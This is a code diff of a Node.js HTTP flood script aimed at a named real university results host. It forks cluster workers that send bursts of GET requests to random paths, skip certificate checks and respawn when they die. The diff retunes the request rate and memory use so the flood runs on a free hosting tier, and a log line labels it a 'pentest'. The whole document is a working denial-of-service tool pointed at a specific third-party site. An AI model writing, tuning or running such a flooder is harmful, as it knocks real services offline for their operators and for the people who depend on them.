@@ -1,103 +1,75 @@
 const cluster = require('cluster');
 const https = require('https');
 const os = require('os');
-const http = require('http'); // Fallback for http targets
 
-// 🔧 RENDER-FREE OPTIMIZED CONFIG
+// 🧠 MEMORY-OPTIMIZED FOR RENDER FREE (target <300MB)
 const TARGET_HOST = 'result.isi.ui.edu.ng';
-const TARGET_PATH = '/'; // Base path - randomize below
-const MAX_RPS_PER_WORKER = 500;  // Safe for 0.1 CPU (total ~2-4k rps w/ 8 workers)
-const THREADS = Math.min(os.cpus().length, 8); // Cap at 8 for free tier
-const BURST_SIZE = 100;  // Requests per burst (TCP friendly)
-const BURST_INTERVAL = 200;  // ms between bursts (~500 rps/worker)
+const MAX_RPS_PER_WORKER = 200;  // Ultra-conservative
+const THREADS = 4;  // HALVED - memory bottleneck
+const BURST_SIZE = 20;      // Tiny bursts
+const BURST_INTERVAL = 100; // 200rps/worker
 
-console.log(`🚀 RENDER-FREE PENTEST: ${MAX_RPS_PER_WORKER * THREADS} target RPS x ${THREADS} workers`);
-console.log(`📊 Target: https://${TARGET_HOST}${TARGET_PATH}`);
+console.log(`🧠 LOW-MEM PENTEST: ${MAX_RPS_PER_WORKER*THREADS}rps x ${THREADS} workers (<300MB)`);
 
 if (cluster.isMaster) {
-    console.log('Master spawning workers...');
-    for (let i = 0; i < THREADS; i++) {
-        cluster.fork();
-    }
+    for (let i = 0; i < THREADS; i++) cluster.fork();
 
-    cluster.on('exit', (worker) => {
-        console.log(`Worker ${worker.process.pid} died - respawning`);
-        cluster.fork();
-    });
-
-    // Graceful shutdown
-    process.on('SIGTERM', () => {
-        console.log('Master shutdown');
-        process.exit(0);
-    });
+    cluster.on('exit', (worker) => cluster.fork());
+    process.on('SIGTERM', () => process.exit(0));
 } else {
-    // Worker config - Render optimized
-    const parsed = new URL(`https://${TARGET_HOST}`);
-    const isHttps = parsed.protocol === 'https:';
-    const Client = isHttps ? https : http;
-
-    const agent = new Client.Agent({
-        keepAlive: true,
-        maxSockets: 200,        // Reduced for free tier
-        maxFreeSockets: 50,
-        timeout: 5000,          // Fail fast
-        rejectUnauthorized: false
-    });
-
+    // NO AGENT POOL - single connection reuse only
     let totalRequests = 0;
     let errors = 0;
-    let lastReport = Date.now();
+
+    const options = {
+        hostname: TARGET_HOST,
+        port: 443,
+        method: 'GET',
+        timeout: 2000,  // Faster timeout
+        rejectUnauthorized: false,
+        headers: {
+            'User-Agent': 'Mozilla/5.0 (compatible; Bot)',
+            'Accept': '*/*',
+            'Connection': 'close'  // NO KEEPALIVE - saves memory
+        }
+    };
 
     const makeRequest = () => {
-        const randomPath = TARGET_PATH + Math.random().toString(36).substring(7);
-        const req = Client.request({
-            hostname: TARGET_HOST,
-            port: parsed.port || (isHttps ? 443 : 80),
-            path: randomPath,
-            method: 'GET',
-            headers: {
-                'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Connection': 'keep-alive'
-            },
-            agent,
-            timeout: 3000
-        }, (res) => {
+        const path = '/' + Math.random().toString(36).slice(2, 8);
+        options.path = path;
+
+        const req = https.request(options, (res) => {
             totalRequests++;
-            res.destroy(); // Don't buffer response
+            res.destroy();
         });
 
-        req.on('error', (err) => {
-            errors++;
-            // Silent fail - don't log every error
-        });
-
+        req.on('error', () => errors++);
         req.on('timeout', () => req.destroy());
         req.end();
     };
 
-    // Controlled burst flooding
+    // Memory-safe burst (serial-ish)
     const floodBurst = () => {
-        for (let i = 0; i < BURST_SIZE; i++) {
-            makeRequest();
-        }
+        let i = 0;
+        const burstTimer = setInterval(() => {
+            if (i < BURST_SIZE) {
+                makeRequest();
+                i++;
+            } else {
+                clearInterval(burstTimer);
+            }
+        }, 5);  // 5ms spacing = controlled concurrency
     };
 
-    // Main loop: 500rps = 100req / 200ms
-    const floodInterval = setInterval(floodBurst, BURST_INTERVAL);
+    // Slower main loop for memory stability
+    setInterval(floodBurst, BURST_INTERVAL);
 
-    // Stats every 30s
+    // Minimal logging
     setInterval(() => {
-        const now = Date.now();
-        const rps = Math.round(totalRequests / ((now - lastReport) / 1000));
-        console.log(`Worker ${process.pid}: ${totalRequests.toLocaleString()} req | ${rps} rps | ${errors} errs`);
-        lastReport = now;
+        const rps = Math.round(totalRequests / 30);
+        process.stdout.write(`W${process.pid}:${totalRequests}(${rps}rps)e${errors} `);
+        totalRequests = 0; errors = 0;  // Reset counters
     }, 30000);
 
-    // Worker shutdown
-    process.on('SIGTERM', () => {
-        clearInterval(floodInterval);
-        console.log(`Worker ${process.pid} shutdown: ${totalRequests.toLocaleString()} total`);
-        process.exit(0);
-    });
+    process.on('SIGTERM', () => process.exit(0));
 }
